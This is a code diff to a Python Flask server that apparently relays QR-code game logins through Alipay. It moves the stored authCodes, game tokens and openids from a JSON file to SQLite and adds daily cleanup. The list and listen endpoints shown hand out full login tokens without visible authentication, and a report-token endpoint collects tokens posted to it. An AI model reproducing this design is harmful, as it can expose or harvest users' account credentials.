@@ -17,9 +17,9 @@ import json
 import time
 import hashlib
 import base64
+import sqlite3
 import threading
-import tempfile
-from datetime import datetime
+from datetime import datetime, timedelta
 
 import requests
 from flask import Flask, request, redirect, jsonify, Response
@@ -118,122 +118,105 @@ config = {
     "scan_count": 0
 }
 
-# 收集的 authCode 列表
-authcodes = []  # [{'authCode': '...', 'time': '...', 'ip': '...'}]
-lock = threading.Lock()
-authcode_changed = threading.Condition(lock)
-AUTHCODE_STORE_PATH = os.environ.get(
-    "AUTHCODE_STORE_PATH",
-    os.path.join(os.path.dirname(__file__), "data", "authcodes.json"),
-)
-_next_authcode_id = 1
+# ==================== SQLite 持久化 ====================
+DB_PATH = os.environ.get("AUTH_DB_PATH", os.path.join(os.path.dirname(os.path.abspath(__file__)), "authcodes.db"))
+
+_db_local = threading.local()
+_db_lock = threading.Lock()  # 仅用于 scan_count 等非 DB 计数器
+authcode_changed = threading.Condition()
 
 
-def _to_int(value, default=0):
-    try:
-        return int(value or default)
-    except (TypeError, ValueError):
-        return default
+def _get_db() -> sqlite3.Connection:
+    """获取当前线程的 SQLite 连接"""
+    if not hasattr(_db_local, 'conn') or _db_local.conn is None:
+        _db_local.conn = sqlite3.connect(DB_PATH, timeout=10)
+        _db_local.conn.row_factory = sqlite3.Row
+        _db_local.conn.execute("PRAGMA journal_mode=WAL")
+    return _db_local.conn
 
 
-def _save_authcodes_locked():
-    """Persist cloud login records. Caller must hold lock/authcode_changed."""
-    os.makedirs(os.path.dirname(AUTHCODE_STORE_PATH), exist_ok=True)
-    payload = {
-        "next_id": _next_authcode_id,
-        "authcodes": authcodes,
-    }
-    fd, tmp_path = tempfile.mkstemp(
-        prefix="authcodes.",
-        suffix=".tmp",
-        dir=os.path.dirname(AUTHCODE_STORE_PATH),
-        text=True,
-    )
-    try:
-        with os.fdopen(fd, "w", encoding="utf-8") as f:
-            json.dump(payload, f, ensure_ascii=False, separators=(",", ":"))
-        os.replace(tmp_path, AUTHCODE_STORE_PATH)
-    finally:
-        if os.path.exists(tmp_path):
-            try:
-                os.remove(tmp_path)
-            except OSError:
-                pass
+def _init_db():
+    """初始化数据库表"""
+    db = _get_db()
+    db.execute("""
+        CREATE TABLE IF NOT EXISTS authcodes (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            time TEXT NOT NULL,
+            ip TEXT DEFAULT '',
+            authCode TEXT DEFAULT '',
+            game_token TEXT DEFAULT '',
+            openid TEXT DEFAULT '',
+            aliUserId TEXT DEFAULT '',
+            serverId TEXT DEFAULT '',
+            params TEXT DEFAULT '{}',
+            url TEXT DEFAULT '',
+            form TEXT DEFAULT '{}',
+            report_type TEXT DEFAULT '',
+            raw_data TEXT DEFAULT '{}',
+            created_at TEXT NOT NULL DEFAULT (datetime('now', 'localtime'))
+        )
+    """)
+    db.execute("CREATE INDEX IF NOT EXISTS idx_created_at ON authcodes(created_at)")
+    db.commit()
 
 
-def _load_authcodes_from_disk():
-    """Load persisted records at boot. Render needs a persistent disk for restarts."""
-    global _next_authcode_id
-    if not os.path.exists(AUTHCODE_STORE_PATH):
-        return
-    try:
-        with open(AUTHCODE_STORE_PATH, "r", encoding="utf-8") as f:
-            payload = json.load(f)
-        if isinstance(payload, dict):
-            rows = payload.get("authcodes", [])
-            saved_next_id = payload.get("next_id")
-        elif isinstance(payload, list):
-            rows = payload
-            saved_next_id = 0
-        else:
-            rows = []
-            saved_next_id = 0
-        if not isinstance(rows, list):
-            rows = []
-        with lock:
-            authcodes.clear()
-            max_id = 0
-            for row in rows:
-                if not isinstance(row, dict):
-                    continue
-                rid = _to_int(row.get("id"), 0)
-                if rid <= 0:
-                    rid = max_id + 1
-                    row["id"] = rid
-                max_id = max(max_id, rid)
-                authcodes.append(row)
-            _next_authcode_id = max(_to_int(saved_next_id, 0), max_id + 1, 1)
-    except Exception as e:
-        print(f"[WARN] load authcode store failed: {e}")
-
-
-def _add_authcode(entry: dict) -> dict:
-    """Append one cloud login record, assign id, persist, and wake long-poll clients."""
-    global _next_authcode_id
+def _db_insert(entry: dict):
+    """插入一条 authcode 记录"""
     with authcode_changed:
-        openid = str(entry.get("openid", "") or "").strip()
+        db = _get_db()
+        openid = str(entry.get('openid', '') or '').strip()
         if openid:
-            authcodes[:] = [
-                row for row in authcodes
-                if str(row.get("openid", "") or "").strip() != openid
-            ]
-        if not entry.get("id"):
-            entry["id"] = _next_authcode_id
-            _next_authcode_id += 1
-        authcodes.append(entry)
-        _save_authcodes_locked()
+            db.execute("DELETE FROM authcodes WHERE openid = ?", (openid,))
+        cur = db.execute("""
+            INSERT INTO authcodes (time, ip, authCode, game_token, openid, aliUserId, serverId, params, url, form, report_type, raw_data)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        """, (
+            entry.get('time', ''),
+            entry.get('ip', ''),
+            entry.get('authCode', ''),
+            entry.get('game_token', ''),
+            openid,
+            entry.get('aliUserId', ''),
+            entry.get('serverId', ''),
+            json.dumps(entry.get('params', {}), ensure_ascii=False),
+            entry.get('url', ''),
+            json.dumps(entry.get('form', {}), ensure_ascii=False),
+            entry.get('report_type', ''),
+            json.dumps(entry.get('raw_data', {}), ensure_ascii=False, default=str),
+        ))
+        db.commit()
         authcode_changed.notify_all()
-        return entry
+        return cur.lastrowid
 
 
-def _delete_authcode_locked(record_id: int) -> dict | None:
-    """Delete by persistent id."""
-    for i, row in enumerate(authcodes):
-        if _to_int(row.get("id"), -1) == record_id:
-            return authcodes.pop(i)
-    return None
+def _db_list(openid: str = "", since_id: int = 0) -> list[dict]:
+    """获取记录（按 id 升序，兼容旧 API 的列表下标顺序）"""
+    db = _get_db()
+    where = []
+    args = []
+    if openid:
+        where.append("openid = ?")
+        args.append(openid)
+    if since_id:
+        where.append("id > ?")
+        args.append(int(since_id))
+    sql = "SELECT * FROM authcodes"
+    if where:
+        sql += " WHERE " + " AND ".join(where)
+    sql += " ORDER BY id"
+    rows = db.execute(sql, args).fetchall()
+    return [_db_row_to_dict(r) for r in rows]
 
 
-def _entry_matches(row: dict, openid: str = "", since_id: int = 0) -> bool:
-    if since_id and _to_int(row.get("id"), 0) <= since_id:
-        return False
-    if openid and str(row.get("openid", "") or "").strip() != openid:
-        return False
-    return True
+def _db_latest_id() -> int:
+    """获取当前最大记录 id。"""
+    db = _get_db()
+    row = db.execute("SELECT COALESCE(MAX(id), 0) FROM authcodes").fetchone()
+    return int(row[0] or 0)
 
 
 def _compact_authcode(row: dict) -> dict:
-    """Small payload for list/heartbeat views; token can be fetched by openid when needed."""
+    """轻量记录，用于快照/心跳，避免出站 token/authCode。"""
     return {
         "id": row.get("id"),
         "time": row.get("time", ""),
@@ -245,7 +228,86 @@ def _compact_authcode(row: dict) -> dict:
     }
 
 
-_load_authcodes_from_disk()
+def _db_row_to_dict(row) -> dict:
+    """将数据库行转为 API 响应格式的 dict"""
+    d = dict(row)
+    # 解析 JSON 字段
+    for k in ('params', 'form', 'raw_data'):
+        if k in d and isinstance(d[k], str):
+            try:
+                d[k] = json.loads(d[k])
+            except (json.JSONDecodeError, TypeError):
+                pass
+    return d
+
+
+def _db_delete_by_id(entry_id: int) -> dict | None:
+    """按数据库 id 删除一条记录"""
+    with authcode_changed:
+        db = _get_db()
+        row = db.execute("SELECT * FROM authcodes WHERE id = ?", (entry_id,)).fetchone()
+        if row:
+            db.execute("DELETE FROM authcodes WHERE id = ?", (entry_id,))
+            db.commit()
+            authcode_changed.notify_all()
+            return _db_row_to_dict(row)
+        return None
+
+
+def _db_delete_by_index(index: int) -> dict | None:
+    """按列表下标删除（兼容旧客户端，按 id 升序第 N 条）"""
+    with authcode_changed:
+        db = _get_db()
+        row = db.execute("SELECT * FROM authcodes ORDER BY id LIMIT 1 OFFSET ?", (index,)).fetchone()
+        if row:
+            db.execute("DELETE FROM authcodes WHERE id = ?", (row['id'],))
+            db.commit()
+            authcode_changed.notify_all()
+            return _db_row_to_dict(row)
+        return None
+
+
+def _db_clear() -> int:
+    """清空所有记录，返回删除数量"""
+    with authcode_changed:
+        db = _get_db()
+        count = db.execute("SELECT COUNT(*) FROM authcodes").fetchone()[0]
+        db.execute("DELETE FROM authcodes")
+        db.commit()
+        authcode_changed.notify_all()
+        return count
+
+
+def _db_count() -> int:
+    """获取记录总数"""
+    db = _get_db()
+    return db.execute("SELECT COUNT(*) FROM authcodes").fetchone()[0]
+
+
+def _db_cleanup_old(days: int = 30) -> int:
+    """删除 N 天前的记录，返回删除条数"""
+    db = _get_db()
+    result = db.execute(
+        "DELETE FROM authcodes WHERE created_at < datetime('now', 'localtime', ?)",
+        (f'-{days} days',)
+    )
+    db.commit()
+    return result.rowcount
+
+
+# ==================== 自动清理线程 ====================
+_cleanup_stop = threading.Event()
+
+
+def _daily_cleanup_thread():
+    """后台线程：每天清理一次超过30天的记录"""
+    while not _cleanup_stop.wait(86400):  # 24小时
+        try:
+            count = _db_cleanup_old(30)
+            if count > 0:
+                debug_log(f"[CLEANUP] 自动清理：删除 {count} 条超过30天的记录")
+        except Exception as e:
+            debug_log(f"[CLEANUP] 异常: {e}", "ERROR")
 
 # ==================== 调试日志 ====================
 # 内存中的调试日志（最多保留200条）
@@ -516,7 +578,7 @@ def index():
         <a href="{login_url}" class="url-link">点击直接跳转登录</a>
         <div class="stats">已扫码 {config['scan_count']} 次</div>
         <div class="authcodes-info">
-            待处理 authCode: {len(authcodes)} 个
+            待处理 authCode: {_db_count()} 个
         </div>
     </div>
 </body>
@@ -586,25 +648,24 @@ def _poll_for_authcode(session_token: str, server_id: str):
                             entry = {
                                 'time':       __import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                 'ip':         'alipay-pc-poll',
-                                'authCode':   auth_code,      # 保留原始（兼容旧逻辑）
-                                'game_token': tok_data['game_token'],  # ★ 已兑换的游戏 token
-                                'openid':     tok_data['openid'],       # ★ 游戏 openId
+                                'authCode':   auth_code,
+                                'game_token': tok_data['game_token'],
+                                'openid':     tok_data['openid'],
                                 'aliUserId':  str(user_id),
                                 'serverId':   server_id,
                                 'params':     {'authCode': auth_code, 'server': server_id},
                                 'url':        '',
                                 'form':       {},
                             }
-                            _add_authcode(entry)
+                            _db_insert(entry)
                             debug_log(f"[POLL] ✅ token 兑换成功并存储! userId={user_id} openid={tok_data['openid']} serverId={server_id or '未指定'}")
                         else:
-                            # ptoken 失败：仍然存入 authCode，让本地端尝试（可能已过期，但留个记录）
                             debug_log(f"[POLL] ⚠ ptoken 兑换失败，仍存入原始 authCode（本地端可能失败）", "WARN")
                             entry = {
                                 'time':       __import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                 'ip':         'alipay-pc-poll',
                                 'authCode':   auth_code,
-                                'game_token': '',   # 空：本地端需自行兑换
+                                'game_token': '',
                                 'openid':     '',
                                 'aliUserId':  str(user_id),
                                 'serverId':   server_id,
@@ -612,7 +673,7 @@ def _poll_for_authcode(session_token: str, server_id: str):
                                 'url':        '',
                                 'form':       {},
                             }
-                            _add_authcode(entry)
+                            _db_insert(entry)
                         return
                     else:
                         debug_log(f"[POLL] ❌ queryPcGameAuthInfo 未返回 authCode: {auth_data}", "ERROR")
@@ -647,7 +708,7 @@ def login():
     debug_log(f"[LOGIN] server_id: {server_id or '未指定'}")
     debug_log(f"[LOGIN] User-Agent: {request.headers.get('User-Agent', 'N/A')[:100]}")
 
-    with lock:
+    with _db_lock:
         config["scan_count"] += 1
 
     token, alipay_url = fetch_fresh_token_and_url()
@@ -801,7 +862,7 @@ def callback():
         'form':     form_data,
     }
 
-    _add_authcode(entry)
+    _db_insert(entry)
 
     if auth_code:
         debug_log(f"[CALLBACK] ✅ 成功获取 authCode! serverId={server_id or '未指定'}")
@@ -841,107 +902,92 @@ def callback():
 
 @app.route('/api/authcodes', methods=['GET'])
 def list_authcodes():
-    """List cloud login records with optional filtering and long polling."""
+    """获取 authCode 列表；支持 openid/since_id/brief/wait 以降低出站流量。"""
     openid = str(request.args.get("openid", "") or "").strip()
-    since_id = _to_int(request.args.get("since_id") or request.args.get("since"), 0)
-    wait_seconds = min(max(_to_int(request.args.get("wait"), 0), 0), 30)
+    since_id = int(request.args.get("since_id") or request.args.get("since") or 0)
+    wait_seconds = min(max(int(request.args.get("wait") or 0), 0), 30)
     brief = str(request.args.get("brief", "0")).lower() in ("1", "true", "yes")
 
-    with authcode_changed:
-        if wait_seconds:
+    if wait_seconds:
+        with authcode_changed:
             deadline = time.monotonic() + wait_seconds
             while True:
-                matched = [
-                    row for row in authcodes
-                    if _entry_matches(row, openid=openid, since_id=since_id)
-                ]
-                if matched:
+                items = _db_list(openid=openid, since_id=since_id)
+                if items:
                     break
                 remain = deadline - time.monotonic()
                 if remain <= 0:
-                    matched = []
+                    items = []
                     break
                 authcode_changed.wait(timeout=min(remain, 5))
-        else:
-            matched = [
-                row for row in authcodes
-                if _entry_matches(row, openid=openid, since_id=since_id)
-            ]
+    else:
+        items = _db_list(openid=openid, since_id=since_id)
 
-        rows = [_compact_authcode(row) for row in matched] if brief else [dict(row) for row in matched]
-        latest_id = max((_to_int(row.get("id"), 0) for row in authcodes), default=0)
-        return jsonify({
-            "ok": True,
-            "count": len(rows),
-            "latest_id": latest_id,
-            "authcodes": rows
-        })
+    out_items = [_compact_authcode(row) for row in items] if brief else items
+    return jsonify({
+        "ok": True,
+        "count": len(out_items),
+        "latest_id": _db_latest_id(),
+        "authcodes": out_items
+    })
 
 
 @app.route('/api/authcodes/listen', methods=['GET'])
 def listen_authcodes():
-    """Wait briefly for records newer than since_id; used by the GUI scan listener."""
-    since_id = _to_int(request.args.get("since_id") or request.args.get("since"), 0)
-    wait_seconds = min(max(_to_int(request.args.get("wait"), 3), 0), 10)
+    """短长轮询新记录；无新记录时只返回很小的空 JSON。"""
+    since_id = int(request.args.get("since_id") or request.args.get("since") or 0)
+    wait_seconds = min(max(int(request.args.get("wait") or 3), 0), 10)
 
     with authcode_changed:
-        latest_id = max((_to_int(row.get("id"), 0) for row in authcodes), default=0)
+        latest_id = _db_latest_id()
         if since_id > latest_id:
-            # If the cloud store was reset/restarted without the old id sequence,
-            # do not let a stale local cursor hide fresh scan records.
             since_id = 0
         deadline = time.monotonic() + wait_seconds
         while True:
-            matched = [
-                row for row in authcodes
-                if _entry_matches(row, since_id=since_id)
-            ]
-            if matched:
+            items = _db_list(since_id=since_id)
+            if items:
                 break
             remain = deadline - time.monotonic()
             if remain <= 0:
-                matched = []
+                items = []
                 break
             authcode_changed.wait(timeout=min(remain, 1))
 
-        latest_id = max((_to_int(row.get("id"), 0) for row in authcodes), default=since_id)
-        return jsonify({
-            "ok": True,
-            "count": len(matched),
-            "latest_id": latest_id,
-            "authcodes": [dict(row) for row in matched],
-        })
+    return jsonify({
+        "ok": True,
+        "count": len(items),
+        "latest_id": _db_latest_id(),
+        "authcodes": items
+    })
 
 
-@app.route('/api/authcodes/<int:index>', methods=['DELETE'])
-def consume_authcode(index):
-    """消费（删除）一个已处理的 authCode"""
-    with authcode_changed:
-        removed = _delete_authcode_locked(index)
-        if removed is not None:
-            _save_authcodes_locked()
-            authcode_changed.notify_all()
-            return jsonify({"ok": True, "removed": removed.get('authCode', ''), "id": removed.get("id")})
+@app.route('/api/authcodes/<int:idx>', methods=['DELETE'])
+def consume_authcode(idx):
+    """消费（删除）一个已处理的 authCode。支持按数据库 id 或列表下标删除。"""
+    # 优先按 id 查找（更可靠），找不到则 fallback 到按列表下标
+    removed = _db_delete_by_id(idx)
+    if removed:
+        return jsonify({"ok": True, "removed": removed.get('authCode', '')})
+    # fallback: 按列表下标（兼容旧客户端）
+    removed = _db_delete_by_index(idx)
+    if removed:
+        return jsonify({"ok": True, "removed": removed.get('authCode', '')})
     return jsonify({"ok": False, "msg": "index out of range"})
 
 
 @app.route('/api/authcodes/clear', methods=['POST'])
 def clear_authcodes():
     """清空所有 authCode"""
-    with authcode_changed:
-        count = len(authcodes)
-        authcodes.clear()
-        _save_authcodes_locked()
-        authcode_changed.notify_all()
+    count = _db_clear()
     return jsonify({"ok": True, "msg": f"Cleared {count} authcodes"})
 
 
 @app.route('/api/accounts', methods=['GET'])
 def list_accounts():
     """兼容旧接口"""
-    with lock:
-        compat = [{'time': a.get('time', ''), 'ip': a.get('ip', ''), 'params': a.get('params', {})} for a in authcodes]
-        return jsonify({"ok": True, "count": len(compat), "accounts": compat})
+    items = _db_list()
+    compat = [{'time': a['time'], 'ip': a['ip'], 'params': a.get('params', {})} for a in items]
+    return jsonify({"ok": True, "count": len(compat), "accounts": compat})
 
 
 @app.route('/api/accounts', methods=['DELETE'])
@@ -955,7 +1001,7 @@ def health():
     return jsonify({
         "status": "ok",
         "scan_count": config["scan_count"],
-        "pending_authcodes": len(authcodes),
+        "pending_authcodes": _db_count(),
         "time": datetime.now().isoformat()
     })
 
@@ -1018,7 +1064,7 @@ def report_token():
         'raw_data': data,
     }
 
-    _add_authcode(entry)
+    _db_insert(entry)
 
     if token_value:
         debug_log(f"[REPORT-TOKEN] >>> 捕获到 token! (len={len(token_value)}) <<<")
@@ -1097,6 +1143,13 @@ def debug_page():
 
 
 # ==================== 启动 ====================
+
+# 应用启动时初始化（兼容 gunicorn 和直接运行）
+_init_db()
+debug_log("[INIT] SQLite 数据库初始化完成")
+_cleanup_thread = threading.Thread(target=_daily_cleanup_thread, daemon=True)
+_cleanup_thread.start()
+debug_log("[INIT] 自动清理线程已启动（每日清理30天前记录）")
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8888))
